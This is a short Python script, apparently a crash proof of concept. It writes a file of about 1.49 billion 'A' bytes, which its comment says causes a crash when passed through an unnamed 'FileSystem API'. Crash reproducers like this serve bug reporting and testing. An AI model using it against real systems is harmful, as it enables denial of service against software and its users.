#This is a simple file to generate a file of sufficient size to cause the crash. It must be invoked using FileSystem API

import os

large_number = '\x41' * 1487078525 

with open('large_file_b', 'wb') as fout:
    fout.write(large_number)



 
